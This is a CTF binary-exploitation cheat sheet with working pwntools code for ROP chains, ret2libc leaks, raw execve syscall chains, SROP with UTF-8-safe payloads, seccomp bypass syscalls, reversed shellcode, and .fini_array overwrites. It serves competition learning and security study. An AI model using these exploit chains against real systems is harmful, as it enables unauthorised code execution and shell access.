# CTF Pwn - ROP Chains and Shellcode

## Table of Contents
- [ROP Chain Building](#rop-chain-building)
  - [Two-Stage ret2libc (Leak + Shell)](#two-stage-ret2libc-leak-shell)
  - [Raw Syscall ROP (When system() Fails)](#raw-syscall-rop-when-system-fails)
  - [rdx Control in ROP Chains](#rdx-control-in-rop-chains)
  - [Shell Interaction After execve](#shell-interaction-after-execve)
- [Seccomp Bypass](#seccomp-bypass)
- [Stack Shellcode with Input Reversal](#stack-shellcode-with-input-reversal)
- [.fini_array Hijack](#fini_array-hijack)
- [Pwntools Template](#pwntools-template)
- [Useful Commands](#useful-commands)

---

## ROP Chain Building

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# Common gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Leak libc
payload = flat(
    b'A' * offset,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']
)
```

### Two-Stage ret2libc (Leak + Shell)

When exploiting in two stages, choose the return target for stage 2 carefully:

```python
# Stage 1: Leak libc via puts@PLT, then re-enter vuln for stage 2
payload1 = b'A' * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(CALL_VULN_ADDR)   # Address of 'call vuln' instruction in main

# IMPORTANT: Return target after leak
# - Returning to main may crash if check_status/setup corrupts stack
# - Returning to vuln directly may have stack issues
# - Best: return to the 'call vuln' instruction in main (e.g., 0x401239)
#   This sets up a clean stack frame via the CALL instruction
```

**Leak parsing with no-newline printf:**
```python
# If printf("Laundry complete") has no trailing newline,
# puts() leak appears right after it on the same line:
# Output: "Laundry complete\x50\x5e\x2c\x7e\x56\x7f\n"
p.recvuntil(b'Laundry complete')
leaked = p.recvline().strip()
libc_addr = u64(leaked.ljust(8, b'\x00'))
```

### Raw Syscall ROP (When system() Fails)

If calling `system()` or `execve()` via libc function entry crashes (CET/IBT, stack issues), use raw `syscall` instruction from libc gadgets:

```python
# Find gadgets in libc
libc_rop = ROP(libc)
pop_rax = libc_rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = libc_rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_rbx = libc_rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]  # common in modern glibc
syscall_ret = libc_rop.find_gadget(['syscall', 'ret'])[0]

# execve("/bin/sh", NULL, NULL) = syscall 59
payload = b'A' * offset
payload += p64(libc_base + pop_rax)
payload += p64(59)
payload += p64(libc_base + pop_rdi)
payload += p64(libc_base + next(libc.search(b'/bin/sh')))
payload += p64(libc_base + pop_rsi)
payload += p64(0)
payload += p64(libc_base + pop_rdx_rbx)
payload += p64(0)
payload += p64(0)  # rbx junk
payload += p64(libc_base + syscall_ret)
```

**When to use raw syscall vs libc functions:**
- `system()` through libc: simplest, but may crash due to stack alignment or CET
- `execve()` through libc: avoids `system()`'s subprocess overhead, same CET risk
- Raw `syscall`: bypasses all libc function prologues, most reliable for ROP
- Note: `pop rdx; ret` is rare in modern libc; look for `pop rdx; pop rbx; ret` instead

### rdx Control in ROP Chains

After calling libc functions (especially `puts`), `rdx` is often clobbered to a small value (e.g., 1). This breaks subsequent `read(fd, buf, rdx)` calls in ROP chains.

**Solutions:**
1. **pop rdx gadget from libc** -- `pop rdx; ret` is rare; look for `pop rdx; pop rbx; ret` (common at ~0x904a9 in glibc 2.35)
2. **Re-enter binary's read setup** -- Jump to code that sets `rdx` before `read`:
   ```python
   # vuln's read setup: lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; mov edi,0; call read
   # Set rbp first so rbp-0x40 points to target buffer:
   POP_RBP_RET = 0x40113d
   VULN_READ_SETUP = 0x4011ea  # lea rax, [rbp-0x40]

   payload += p64(POP_RBP_RET)
   payload += p64(TARGET_ADDR + 0x40)  # rbp-0x40 = TARGET_ADDR
   payload += p64(VULN_READ_SETUP)     # read(0, TARGET_ADDR, 0x100)
   # WARNING: After read, code continues to printf + leave;ret
   # leave sets rsp=rbp, so you get a stack pivot to rbp!
   ```
3. **Stack pivot via leave;ret** -- When re-entering vuln's read code, the `leave;ret` after read pivots the stack to `rbp`. Write your next ROP chain at `rbp+8` in the data you send via read.

### Shell Interaction After execve

After spawning a shell via ROP, the shell reads from the same stdin as the binary. Commands sent too early may be consumed by prior `read()` calls.

```python
p.send(payload)  # Trigger execve

# Wait for shell to initialize before sending commands
import time
time.sleep(1)
p.sendline(b'id')
time.sleep(0.5)
result = p.recv(timeout=3)

# For flag retrieval:
p.sendline(b'cat /flag* flag* 2>/dev/null')
time.sleep(0.5)
flag = p.recv(timeout=3)

# DON'T pipe commands via stdin when using pwntools - they get consumed
# by earlier read() calls. Use explicit sendline() after delays instead.
```

## SROP with UTF-8 Payload Constraints (DiceCTF 2026)

**Pattern (Message Store):** Rust binary where OOB color index reads memcpy from GOT, causing `memcpy(stack, BUFFER, 0x1000)` — a massive stack overflow. But `from_utf8_lossy()` validates the buffer first: any invalid UTF-8 triggers `Cow::Owned` with corrupted replacement data. **The entire 0x1000-byte payload must be valid UTF-8.**

**Why SROP:** Normal ROP gadget addresses contain bytes >0x7f which are invalid single-byte UTF-8. SROP needs only 3 gadgets (set rax=15, call syscall) to trigger `sigreturn`, then a signal frame sets ALL registers for `execve("/bin/sh", NULL, NULL)`.

**UTF-8 multi-byte spanning trick:** Register fields in the signal frame are 8 bytes each, packed contiguously. A 3-byte UTF-8 sequence can start in one field and end in the next:

```python
from pwn import *

# r15 is the field immediately before rdi in the sigframe
# rdi = pointer to "/bin/sh" = 0x2f9fb0 → bytes [B0, 9F, 2F, ...]
# B0, 9F are UTF-8 continuation bytes (10xxxxxx) — invalid as sequence start
# Solution: set r15's last byte to 0xE0 (3-byte UTF-8 leader)
# E0 B0 9F = valid UTF-8 (U+0C1F) spanning r15→rdi boundary

frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = buf_addr + 0x178  # address of "/bin/sh\0"
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
frame.r15 = 0xE000000000000000  # Last byte 0xE0 starts 3-byte UTF-8 seq

# ROP preamble: 3 UTF-8-safe gadgets
payload = b'\x00' * 0x48           # padding to return address
payload += p64(pop_rax_ret)        # set rax = 15 (sigreturn)
payload += p64(15)
payload += p64(syscall_ret)        # trigger sigreturn
payload += bytes(frame)
# Place "/bin/sh\0" at offset 0x178 in BUFFER
```

**When to use:** Any exploit where payload bytes pass through UTF-8 validation (Rust `String`, `from_utf8`, JSON parsers). SROP minimizes the number of gadget addresses that must be UTF-8-safe.

**Key insight:** Multi-byte UTF-8 sequences (2-4 bytes) can span adjacent fields in structured data (signal frames, ROP chains). Set the leader byte (0xC0-0xF7) as the last byte of one field so continuation bytes (0x80-0xBF) in the next field form a valid sequence.

## Seccomp Bypass

Alternative syscalls when seccomp blocks `open()`/`read()`:
- `openat()` (257), `openat2()` (437, often missed!), `sendfile()` (40), `readv()`/`writev()`

**Check rules:** `seccomp-tools dump ./binary`

See [advanced.md](advanced.md) for: conditional buffer address restrictions, shellcode construction without relocations (call/pop trick), seccomp analysis from disassembly, `scmp_arg_cmp` struct layout.

## Stack Shellcode with Input Reversal

**Pattern (Scarecode):** Binary reverses input buffer before returning.

**Strategy:**
1. Leak address via info-leak command (bypass PIE)
2. Find `sub rsp, 0x10; jmp *%rsp` gadget
3. Pre-reverse shellcode and RIP overwrite bytes
4. Use partial 6-byte RIP overwrite (avoids null bytes from canonical addresses)
5. Place trampoline (`jmp short`) to hop back into NOP sled + shellcode

**Null-byte avoidance with `scanf("%s")`:**
- Can't embed `\x00` in payload
- Use partial pointer overwrite (6 bytes) -- top 2 bytes match since same mapping
- Use short jumps and NOP sleds instead of multi-address ROP chains

## .fini_array Hijack

**When to use:** Writable `.fini_array` + arbitrary write primitive. When `main()` returns, entries called as function pointers. Works even with Full RELRO.

```python
# Find .fini_array address
fini_array = elf.get_section_by_name('.fini_array').header.sh_addr
# Or: objdump -h binary | grep fini_array

# Overwrite with format string %hn (2-byte writes)
writes = {
    fini_array: target_addr & 0xFFFF,
    fini_array + 2: (target_addr >> 16) & 0xFFFF,
}
```

**Advantages over GOT overwrite:** Works even with Full RELRO (`.fini_array` is in a different section). Especially useful when combined with RWX regions for shellcode.

## Pwntools Template

```python
from pwn import *

context.binary = elf = ELF('./binary')
context.log_level = 'debug'

def conn():
    if args.REMOTE:
        return remote('host', port)
    return process('./binary')

io = conn()
# exploit here
io.interactive()
```

## Useful Commands

```bash
one_gadget libc.so.6           # Find one-shot gadgets
ropper -f binary               # Find ROP gadgets
ROPgadget --binary binary      # Alternative gadget finder
seccomp-tools dump ./binary    # Check seccomp rules
```
